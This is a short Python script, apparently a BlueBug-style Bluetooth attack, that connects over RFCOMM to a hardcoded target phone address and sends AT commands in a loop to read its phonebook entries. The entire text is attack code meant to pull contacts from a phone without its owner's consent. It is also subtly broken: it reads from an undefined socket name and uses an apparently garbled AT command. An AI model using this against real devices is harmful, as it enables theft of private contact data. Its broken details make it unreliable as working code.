import bluetooth
tgtPhone = '68:76:4F:50:CB:3C'
port = 19

phoneSock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
phoneSock.connect((tgtPhone, port))
for contact in range(5):
    atCmd= 'AT+CPBER=' + str(contact) + '\n'
    phoneSock.send(atCmd)
    result = client_sock.recv(1024)
    print '[+] ' + str(contact) + ': ' + result
#sock.close()
